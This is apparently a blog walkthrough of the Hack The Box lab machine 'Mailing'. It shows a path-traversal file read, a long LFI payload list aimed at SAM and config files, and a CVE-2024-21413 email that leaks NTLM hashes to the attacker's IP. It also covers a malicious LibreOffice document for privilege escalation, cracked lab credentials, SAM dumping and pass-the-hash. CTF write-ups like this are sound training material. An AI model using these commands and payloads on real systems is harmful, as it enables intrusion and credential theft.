---
title: "[EASY] HTB-Mailing"
draft: false
tags:
  - htb
  - windows
  - lfi
  - smtp
  - hmailserver
  - responder
  - sam
---
![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/mailing/Mailing.png)

Mailing is an Easy Windows machine on HTB that felt more like medium level to me. Big part of solving this machine included user interaction via scheduled task, which was interesting since more CTF machines don't have this. I gain Administrator hash for mail server through LFI vulnerability. With the Mail Server access as the Admin, I sent out payload email and capture NTLM hash using Responder. For privilege escalation, I exploited outdated libreoffice which allowed me to run commands as the admin. 
## Information Gathering
### Rustscan

Rustscan finds bunch of ports open. This server seems to be running mail server as well.


```bash
┌──(yoon㉿kali)-[~/Documents/htb/mailing]
└─$ rustscan --addresses 10.10.11.14 --range 1-65535
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
🌍HACK THE PLANET🌍
<snip>
Nmap scan report for mailing.htb (10.10.11.14)
Host is up, received syn-ack (0.11s latency).
Scanned at 2024-05-06 00:33:15 EDT for 1s

PORT      STATE SERVICE      REASON
25/tcp    open  smtp         syn-ack
80/tcp    open  http         syn-ack
110/tcp   open  pop3         syn-ack
135/tcp   open  msrpc        syn-ack
139/tcp   open  netbios-ssn  syn-ack
143/tcp   open  imap         syn-ack
445/tcp   open  microsoft-ds syn-ack
465/tcp   open  smtps        syn-ack
587/tcp   open  submission   syn-ack
993/tcp   open  imaps        syn-ack
5040/tcp  open  unknown      syn-ack
5985/tcp  open  wsman        syn-ack
7680/tcp  open  pando-pub    syn-ack
47001/tcp open  winrm        syn-ack
49664/tcp open  unknown      syn-ack
49665/tcp open  unknown      syn-ack
49666/tcp open  unknown      syn-ack
49667/tcp open  unknown      syn-ack
49668/tcp open  unknown      syn-ack
56889/tcp open  unknown      syn-ack
59762/tcp open  unknown      syn-ack

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 1.44 seconds
```



## Enumeration
### HTTP - TCP 80

The website shows us Mail Server home page and it is powered by hMailServer. 

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/mailing/image.png)


Some potential usernames can be seen below of the page:

- Ruy Alonso
- Maya Bendito
- Gregory Smith

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/mailing/image-1.png)

Feroxbuster finds several interesting paths including **download.php**:


![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/mailing/image-4.png)


#### Instructions.pdf

Instructions.pdf is a file that guides user with Installation and setup:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/mailing/image-2.png)

New IP address is seen and this could be implying pivoting later:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/mailing/image-3.png)

Email address convention can be seen as well: firstname@mailing.htb

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/mailing/image-5.png)

Following the email address convention, we will create potential list of usernames:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/mailing/image-6.png)


### SMTP - TCP 25

We can list available smtp commands using below but nothing too interesting is seen:

`nmap -p25 --script smtp-commands 10.10.11.14`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/mailing/image-7.png)


### hMailServer LFI

Searching for known vulnerabilities regarding hMailServer, it seems like there is a vulnerability about LFI:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/mailing/image-8.png)

Let's try testing LFI vulnerability on download.php parameter using Burp Suite intruder:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/mailing/image-9.png)

Several of our payload confirms LFI. (Payloads that is used here can be found on references page below)

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/mailing/image-10.png)

## Access to Mail Server
### LFI

Through some research, it seems that **hMailServer.INI** contains interesting information about hMailServer. 

Let's take a look at it using the command below:

```bash
/download.php?file=..\..\..\..\..\../../../Program+Files+(x86)/hMailServer/Bin/hMailServer.INI
```

**hMailServer.INI** reveals password hashes as such:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/mailing/image-11.png)


### Password Cracking

Using crackstation, we can easily crack the password hash for administrator:

**administrator**:**homenetworkingadministrator**

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/mailing/image-12.png)

### Mail Access

Now we can signin to mail server as Administrator using the cracked credentials:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/mailing/image-13.png)

However, this mail server is empty:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/mailing/image-14.png)

It seems like there should be some sort of user interaction to get initial foothold

## Shell as maya
### Responder

Using [this exploit](https://github.com/xaitax/CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability?tab=readme-ov-file), I can craft email that contains malicious link that will enable attack to grab NTLM hash from it:

`python CVE-2024-21413.py --server 10.10.11.14 --port 587 --username administrator@mailing.htb --password homenetworkingadministrator --send administrator@mailing.htb --recipient maya@mailing.htb --url "\\10.10.14.20\test.txt" --subject "blahblah"`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/mailing/image-16.png)

After sending malicious email, Responder captures NTLM hash for user **maya**:

`sudo responder -I tun0`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/mailing/image-17.png)

### NTLM Crack

Using hashcat, we can easily crack NTLM hash:

`hashcat -m 5600 maya.hash ~/Downloads/rockyou.txt`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/mailing/mailing-crack.png)

### Evil-Winrm

Now through evil-winrm, we have shell as **maya**:

`evil-winrm -i 10.10.11.14 -u maya -p m4y4ngs4ri`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/mailing/image-15.png)


## Privesc: maya to administrator
### CVE-2023-2255

Enumerating the file system, we can see that LibreOffice 7.4 is installed on this server:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/mailing/image-18.png)

From some research, it seems that LibreOffice 7.4 is vulnerable to [CVE-2023-2055](https://github.com/elweth-sec/CVE-2023-2255)

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/mailing/image-19.png)

We can use [this payload](https://github.com/elweth-sec/CVE-2023-2255) to create malicious .odt file  that will add user maya to Administrator group:


`python3 CVE-2023-2255.py --cmd 'net localgroup Administradores maya /add' --output 'exploit.odt'`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/mailing/image-22.png)

Let's upload created exploit.odt to **Important Documents** folder where there is scheduled tasks for user interaction:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/mailing/image-23.png)


Check user group using `net user maya`, now maya is in Administrators group:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/mailing/image-24.png)

### Dump SAM Hash

Since Maya is in the administrators group now, let's dump SAM using crackmapexec:

`crackmapexec smb 10.10.11.14 -u maya -p "m4y4ngs4ri" --sam`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/mailing/image-25.png)

Using evil-winrm and localadmin password hash, we can grab root.txt:

`evil-winrm -i 10.10.11.14 -u localadmin -H 9aa582783780d1546d62f2d102daefae`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/mailing/image-26.png)

## References
- https://www.exploit-db.com/exploits/7012
- https://github.com/xaitax/CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability?tab=readme-ov-file
- https://github.com/elweth-sec/CVE-2023-2255


## LFI Payloads

```bash
Apache\conf\httpd.conf
Apache\logs\access.log
Apache\logs\error.log
Apache2\conf\httpd.conf
Apache2\logs\access.log
Apache2\logs\error.log
Apache22\conf\httpd.conf
Apache22\logs\access.log
Apache22\logs\error.log
Apache24\conf\httpd.conf
Apache24\logs\access.log
Apache24\logs\error.log
Documents and Settings\Administrator\NTUser.dat
php\php.ini
php4\php.ini
php5\php.ini
php7\php.ini
Program Files (x86)\Apache Group\Apache\conf\httpd.conf
Program Files (x86)\Apache Group\Apache\logs\access.log
Program Files (x86)\Apache Group\Apache\logs\error.log
Program Files (x86)\Apache Group\Apache2\conf\httpd.conf
Program Files (x86)\Apache Group\Apache2\logs\access.log
Program Files (x86)\Apache Group\Apache2\logs\error.log
c:\Program Files (x86)\php\php.ini
Program Files\Apache Group\Apache\conf\httpd.conf
Program Files\Apache Group\Apache\conf\logs\access.log
Program Files\Apache Group\Apache\conf\logs\error.log
Program Files\Apache Group\Apache2\conf\httpd.conf
Program Files\Apache Group\Apache2\conf\logs\access.log
Program Files\Apache Group\Apache2\conf\logs\error.log
Program Files\FileZilla Server\FileZilla Server.xml
Program Files\MySQL\my.cnf
Program Files\MySQL\my.ini
Program Files\MySQL\MySQL Server 5.0\my.cnf
Program Files\MySQL\MySQL Server 5.0\my.ini
Program Files\MySQL\MySQL Server 5.1\my.cnf
Program Files\MySQL\MySQL Server 5.1\my.ini
Program Files\MySQL\MySQL Server 5.5\my.cnf
Program Files\MySQL\MySQL Server 5.5\my.ini
Program Files\MySQL\MySQL Server 5.6\my.cnf
Program Files\MySQL\MySQL Server 5.6\my.ini
Program Files\MySQL\MySQL Server 5.7\my.cnf
Program Files\MySQL\MySQL Server 5.7\my.ini
Program Files\php\php.ini
Users\Administrator\NTUser.dat
Windows\debug\NetSetup.LOG
Windows\Panther\Unattend\Unattended.xml
Windows\Panther\Unattended.xml
Windows\php.ini
Windows\repair\SAM
Windows\repair\system
Windows\System32\config\AppEvent.evt
Windows\System32\config\RegBack\SAM
Windows\System32\config\RegBack\system
Windows\System32\config\SAM
Windows\System32\config\SecEvent.evt
Windows\System32\config\SysEvent.evt
Windows\System32\config\SYSTEM
Windows\System32\drivers\etc\hosts
Windows\System32\winevt\Logs\Application.evtx
Windows\System32\winevt\Logs\Security.evtx
Windows\System32\winevt\Logs\System.evtx
Windows\win.ini
xampp\apache\conf\extra\httpd-xampp.conf
xampp\apache\conf\httpd.conf
xampp\apache\logs\access.log
xampp\apache\logs\error.log
xampp\FileZillaFTP\FileZilla Server.xml
xampp\MercuryMail\MERCURY.INI
xampp\mysql\bin\my.ini
xampp\php\php.ini
xampp\security\webdav.htpasswd
xampp\sendmail\sendmail.ini
xampp\tomcat\conf\server.xml
```


